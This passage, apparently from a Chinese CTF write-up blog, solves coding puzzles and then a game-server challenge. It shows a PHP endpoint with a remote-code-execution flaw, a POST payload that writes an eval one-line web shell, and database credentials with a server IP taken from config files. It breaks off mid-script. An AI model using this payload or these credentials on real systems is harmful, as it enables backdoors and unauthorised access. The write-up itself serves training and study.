功能，可以展示 TCP 流量的来回通信。</p><p>为了给某产品增加显示 TCP 来回流量的功能，你准备读取流量文件来生成类似的展示效果。</p><p><strong>Input</strong></p><p>第一行输入一个数字 N，表示接下来有 N 行。</p><p>接下来 N 行，每一行都由两部分组成。首先是一个数字 D，数字 D 为 0 表示为客户端发给服务器的方向，数字 D 为 1 表示服务器发给客户端方向；然后第二部分是一个 base64 字符串，表示编码后的流量具体内容。</p><p><strong>Output</strong></p><p>对于每一行的流量包，生成类似 wireshark 的 hexdump 模式的流量展示。其中：</p><ol><li><p>每行开头都是 8 位 hex，表示当前这一行在该流量包的偏移。</p></li><li><p>两个空格之后，是该流量包的 hex dump 内容，每行 16 个 hex dump。</p></li><li><p>hex dump 之后，是该流量包内容的字符显示，对于可见字符(32 ~ 126)，显示字符本身，对于不可见字符，显示一个 . 号</p></li><li><p>对于无法凑齐 16 个 hex 的行，其不足的内容用空格代替。确保每一行的总长度是相等的。</p></li><li><p>根据下面的样例，仔细处理空格的数量。</p></li></ol></blockquote><p>按照输出要求格式化解析即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"></span><br><span class="line">N = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    k, b = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    h = <span class="built_in">list</span>(b64decode(b.encode()))</span><br><span class="line">    <span class="keyword">if</span> k == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ceil(<span class="built_in">len</span>(h)/<span class="number">16</span>)):</span><br><span class="line">            ind = <span class="built_in">hex</span>(i*<span class="number">16</span>)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            hh = h[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)]</span><br><span class="line">            hh1 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[:<span class="number">8</span>])))</span><br><span class="line">            hh2 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[<span class="number">8</span>:])))</span><br><span class="line">            ch1 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            ch2 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;ind&#125;</span>  <span class="subst">&#123;hh1&#125;</span>  <span class="subst">&#123;hh2&#125;</span>   <span class="subst">&#123;ch1&#125;</span> <span class="subst">&#123;ch2&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ceil(<span class="built_in">len</span>(h)/<span class="number">16</span>)):</span><br><span class="line">            ind = <span class="built_in">hex</span>(i*<span class="number">16</span>)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            hh = h[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)]</span><br><span class="line">            hh1 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[:<span class="number">8</span>])))</span><br><span class="line">            hh2 = <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">hex</span>(j)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]] + [<span class="string">&#x27;  &#x27;</span>]*(<span class="number">8</span>-<span class="built_in">len</span>(hh[<span class="number">8</span>:])))</span><br><span class="line">            ch1 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[:<span class="number">8</span>]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            ch2 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">if</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>) <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> hh[<span class="number">8</span>:]]).ljust(<span class="number">8</span>,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;        <span class="subst">&#123;ind&#125;</span>  <span class="subst">&#123;hh1&#125;</span>  <span class="subst">&#123;hh2&#125;</span>   <span class="subst">&#123;ch1&#125;</span> <span class="subst">&#123;ch2&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Fight-Clones"><a href="#Fight-Clones" class="headerlink" title="Fight Clones"></a>Fight Clones</h3><blockquote><p><strong>Description</strong></p><p>Neo 被 Smith 的分身们包围了！他需要击败他们！</p><p>每一个 Smith 都有自己的攻击值和生命值。在受到攻击之前，他们都可以持续攻击 Neo。</p><p>Neo 也有自己的攻击值和生命值，虽然比 Smith 高得多，但是 Neo 一次也只能攻击一个 Smith（是的他没有 AOE）。</p><p>Neo 需要找到一个最优的攻击策略，以保证自己生命值被减为零之前击倒所有 Smith。</p><p>Neo 的生命值是确定的，Oracle 之前告诉过他。但是他需要知道自己的攻击值是否能够确保打赢 Smith 们。</p><p>你能帮 Neo 计算出他所需要的最小攻击值么？</p><p><strong>Input</strong></p><p>第一行输入两个整数 $N H$ ($1 \le N \le 1000,1 \le H \le 1000000$)，表示总共有 $N$ 个 Smith，以及 Neo 的生命值为 $H$。</p><p>接下来 $N$ 行，表示 $N$ 个 Smith 的属性，每行格式为 $AH$，其中</p><p>- $A$ 为该 Smith 的攻击值 ($1 \le A \le 1000$)。</p><p>- $H$ 为该 Smith 的生命值 ($1 \le H \le 1000$)。</p><p><strong>Output</strong></p><p>输出一个整数，表示所需要的最小攻击值。如果无法保证击败 Smith 们则输出 <code>-1</code>。</p><p><strong>Hint</strong></p><p>Neo 和 Smith 们是 <code>实时战斗制</code>（非回合制），即 Neo 和 Smith 们可以<strong>同时</strong>攻击对方，只不过 Neo 一个时间只能打一个 Smith，</p><p>而 Smith 们可以群殴 Neo（不用考虑碰撞体积的问题）。</p><p>可以假定 Neo 和 Smith 们每单位时间只能<strong>击打对手一次</strong>。例如，某个 Smith 生命值为 20，而 Neo 攻击值为 15，那 Neo 也需要消耗</p><p>两个单位的时间来消灭该 Smith，同时意味着有 10 单位的攻击力被浪费掉了。</p><p>Smith 一旦受到 Neo 的攻击，就会停止击打 Neo。例如 Neo 和 Smith 某一个时刻同时攻击对方，Neo 则不会受到伤害。</p></blockquote><p>贪心算法+二分查找最小攻击值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> cmp_to_key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">custom_sort</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> y[<span class="number">0</span>] * x[<span class="number">2</span>] - x[<span class="number">0</span>] * y[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_min_attack</span>(<span class="params">neo_life, smiths</span>):</span></span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    r = <span class="number">1000</span></span><br><span class="line">    ans = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">        m = (l + r) // <span class="number">2</span></span><br><span class="line">        s = [(k[<span class="number">0</span>], k[<span class="number">1</span>], (k[<span class="number">1</span>]+m-<span class="number">1</span>)//m) <span class="keyword">for</span> k <span class="keyword">in</span> smiths]</span><br><span class="line">        s.sort(key=cmp_to_key(custom_sort))</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            res += t*s[i][<span class="number">0</span>]</span><br><span class="line">            t += s[i][<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> res &lt; neo_life:</span><br><span class="line">            ans = m</span><br><span class="line">            r = m - <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">N, H = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split()))</span><br><span class="line">smiths = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    smiths.append(<span class="built_in">tuple</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split())))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(find_min_attack(H, smiths))</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="gaming"><a href="#gaming" class="headerlink" title="gaming"></a>gaming</h2><h3 id="游戏来咯"><a href="#游戏来咯" class="headerlink" title="游戏来咯"></a>游戏来咯</h3><p>登录游戏就在公告栏看到flag：<code>flag&#123;churusanguo&#125;</code>。</p><p>​    </p><h3 id="攻城拔寨"><a href="#攻城拔寨" class="headerlink" title="攻城拔寨"></a>攻城拔寨</h3><p>达到一定等级后游戏内会收到邮件，按 <strong>getshell</strong> 一题拿到权限后，找到 <code>D:/APMServ5.2.6/www/htdocs/server/config/db.php</code>，得到mysql数据库账号密码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&#x27;db_persistent&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">define(<span class="string">&#x27;db_RDBMS&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;db_Username&#x27;</span>, <span class="string">&#x27;sgphp1g2ame&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;db_Password&#x27;</span>, <span class="string">&#x27;@Qwer123456&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;db_Server&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;db_Port&#x27;</span>, <span class="string">&#x27;3306&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;db_Database&#x27;</span>, <span class="string">&#x27;bloodwar&#x27;</span>);</span><br></pre></td></tr></table></figure><p>在蚁剑用mysql连接，账号 <code>sgphp1g2ame</code>，密码 <code>@Qwer123456</code>，在表 <code>sys_mail_sys_content</code> 中找到邮件内容：<code>恭喜恭喜, flag2 flag&#123;jiaguanjinjueN&#125;</code>。</p><p>​    </p><h3 id="特殊玩家"><a href="#特殊玩家" class="headerlink" title="特殊玩家"></a>特殊玩家</h3><p>有玩家的名字是flag，按 <strong>getshell</strong> 一题拿到权限后，源码自带修改器，打开前修改配置文件 <code>config.ini</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[config]</span><br><span class="line">IP=120.55.42.64</span><br><span class="line">数据库=bloodwar</span><br><span class="line">账号=sgphp1g2ame</span><br><span class="line">密码=@Qwer123456</span><br><span class="line">端口=3306</span><br><span class="line">路径=D:\APMServ5.2.6\www\htdocs\images\armor</span><br><span class="line">聊天端口=5308</span><br><span class="line">登录信息=</span><br></pre></td></tr></table></figure><p>打开修改器，在用户基本信息发现用户名 <code>flag&#123;mysqlwo&#125;</code>。</p><p>​    </p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>在源码 <code>APMServ5.2.6/www/htdocs/server/game/BattleNetGateway.php</code> 中发现容易控制传值的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;interface.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;utils.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;BattleFunc.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;HeroFunc.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;BattleNetServices.php&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;BATTLE_NET_KEY&quot;</span>,<span class="string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!defined(<span class="string">&#x27;PATH_SEPARATOR&#x27;</span>)) &#123;<span class="keyword">if</span> (substr(PHP_OS, <span class="number">0</span>, <span class="number">3</span>) == <span class="string">&#x27;WIN&#x27;</span>) define(<span class="string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="string">&#x27;;&#x27;</span>); <span class="keyword">else</span> define(<span class="string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="string">&#x27;:&#x27;</span>);&#125;</span><br><span class="line">ini_set(<span class="string">&#x27;include_path&#x27;</span>,ini_get(<span class="string">&#x27;include_path&#x27;</span>).PATH_SEPARATOR.realpath(<span class="string">&quot;../&quot;</span>)); </span><br><span class="line"></span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_POST</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$param</span>))<span class="variable">$param</span>=<span class="variable">$_GET</span>;</span><br><span class="line"><span class="variable">$from_uid</span>=<span class="variable">$param</span>[<span class="string">&quot;from_uid&quot;</span>];</span><br><span class="line"><span class="variable">$sign</span>=<span class="variable">$param</span>[<span class="string">&quot;sign&quot;</span>];</span><br><span class="line"><span class="variable">$commandFunc</span>=<span class="variable">$param</span>[<span class="string">&quot;commandFunc&quot;</span>];</span><br><span class="line"><span class="variable">$content</span>=urldecode(<span class="variable">$param</span>[<span class="string">&quot;content&quot;</span>]);</span><br><span class="line"><span class="variable">$content_encoding</span>=<span class="variable">$param</span>[<span class="string">&quot;content-encoding&quot;</span>];</span><br><span class="line"><span class="comment">//$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$sign</span>!=md5(<span class="variable">$from_uid</span>.<span class="variable">$commandFunc</span>.<span class="variable">$content</span>.BATTLE_NET_KEY))  <span class="comment">//sign为传入值与key连接字符串的md5值</span></span><br><span class="line"><span class="variable">$ret</span>[]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$content_encoding</span>==<span class="string">&quot;csv&quot;</span>)&#123;</span><br><span class="line"><span class="variable">$inputParams</span>=explode(<span class="string">&quot;|&quot;</span>,<span class="variable">$content</span>);  <span class="comment">//按|分割content传入内容</span></span><br><span class="line"><span class="keyword">if</span>(count(<span class="variable">$inputParams</span>)==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$inputParams</span>=<span class="variable">$inputParams</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[]=<span class="variable">$commandFunc</span>(<span class="variable">$from_uid</span>,<span class="variable">$inputParams</span>); <span class="comment">//RCE漏洞</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$inputParams</span>=json_decode(<span class="variable">$content</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$inputParams</span>)&amp;&amp;count(<span class="variable">$inputParams</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">     <span class="variable">$inputParams</span>=array_shift(<span class="variable">$inputParams</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[]=<span class="variable">$commandFunc</span>(<span class="variable">$from_uid</span>,<span class="variable">$inputParams</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ret</span>[] = <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$content_encoding</span>==<span class="string">&quot;csv&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">print</span> implode(<span class="string">&quot;|&quot;</span>,<span class="variable">$ret</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span> json_encode(<span class="variable">$ret</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此处可以RCE，分析代码逻辑，利用 <code>file_put_contents</code> 写入一句话木马：</p><p>POST: <code>from_uid=xx.php&amp;commandFunc=file_put_contents&amp;content=&lt;%3fphp%20%40eval($_POST[xxx])%3b&amp;content-encoding=csv&amp;sign=734c00692057aaf9f6c763f405cbec6b</code></p><p>蚁剑连接，在D:目录下找到 <code>flag.txt</code>，flag：<code>flag&#123;breakItAndOutIt&#125;</code>。</p><p>​    </p><h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><h3 id="文字频率分析"><a href="#文字频率分析" class="headerlink" title="文字频率分析"></a>文字频率分析</h3><p>非预期解法，将1000×1000图片分割为400张50×50的图片：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;word.png&#x27;</span>)</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        box = (<span class="number">50</span>*i,<span class="number">50</span>*j,<span class="number">50</span>*(i+<span class="number">1</span>),<span class="number">50</span>*(j+<span class="number">1</span>))</span><br><span class="line">        region = im.crop(box)</span><br><span class="line">        region.save(<span class="string">f&#x27;img/<span class="subst">&#123;c&#125;</span>.png&#x27;</span>)</span><br><span class="line">        c += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>测试发现相同字母的图片，其文件md5值相同，利用此规律统计字频，先操作一次找出26个字母对应文件的md5值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">sample = [<span class="number">7</span>,<span class="number">38</span>,<span class="number">28</span>,<span class="number">0</span>,<span class="number">73</span>,<span class="number">13</span>,<span class="number">42</span>,<span class="number">18</span>,<span class="number">36</span>,<span class="number">102</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">19</span>,</span><br><span class="line">    <span class="number">9</span>,<span class="number">58</span>,<span class="number">20</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">30</span>,<span class="number">50</span>,<span class="number">24</span>,<span class="number">11</span>,<span class="number">22</span>,<span class="number">8</span>,<span class="number">66</span>]</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">    path = <span class="string">fr&#x27;C:\Users\admin\Desktop\img\&#123;i&#125;.png&#x27;</span></span><br><span class="line">    m.append(md5(<span class="built_in">open</span>(path,<span class="string">&#x27;rb&#x27;</span>).read()).hexdigest())</span><br><span class="line"></span><br><span class="line">res = Counter(m)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line"></span><br><span class="line">alp_md5 = [m[sample[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"><span class="built_in">print</span>(alp_md5)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到md5对应list</span></span><br><span class="line"><span class="comment"># [&#x27;d108ad1582e37a825d092131a55babcc&#x27;, &#x27;9901603c7d2a5dde25723c9e569428da&#x27;, &#x27;5e47df30ddf5e623c9bbcd4fde58ec88&#x27;, &#x27;5bf0c7d972b37455dc32777ffdad86b9&#x27;, &#x27;33ff92480ee08585d901ffd0a47de021&#x27;, &#x27;3d3f026d8fc719c35a917d98d9b7474b&#x27;, &#x27;c07bd9475b8e9d65334e2f24f19794b3&#x27;, &#x27;4497c04cea4897727d88f7945bc86d77&#x27;, &#x27;047fd19a9a30301444e11394ee99d8be&#x27;, &#x27;802d7d3a2c02a1b6ba5f0860b70b54df&#x27;, &#x27;52d9844a5ed4eee07af4f48f880e3d5b&#x27;, &#x27;109d33cf832c83ebebca8c4f165862a9&#x27;, &#x27;f5252d81a8afc71cf5dd29270a398beb&#x27;, &#x27;121808a4d3f160f235f27cb77355d525&#x27;, &#x27;b15356da578f67bac5a3d777913ce97d&#x27;, &#x27;a174639d2070109e85ffb53657d5c9d5&#x27;, &#x27;e30a3ca0d2f0326a10175e8d6ed8a178&#x27;, &#x27;a267e80b28a9dae7e2c5d70198e808d7&#x27;, &#x27;e1e4b54464f7ae41ba2c71a9244d7347&#x27;, &#x27;ccf09a4c80cc7e4b3134ea53f423ec38&#x27;, &#x27;5b5480bc64f225e422ed8f084e629ff8&#x27;, &#x27;f17c5f58bf983a684cc8d7d4b3c1ae0b&#x27;, &#x27;287d3dac4e058281282e0eee00d9ddd4&#x27;, &#x27;a782a16d1fca70e6217e45dd3fe8ae6e&#x27;, &#x27;18cad01f22ca7c4bc9a7536474d17273&#x27;, &#x27;a4e1c4687c9c785271fc24f79aa2e0f0&#x27;]</span></span><br></pre></td></tr></table></figure><p>再综合起来解题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span 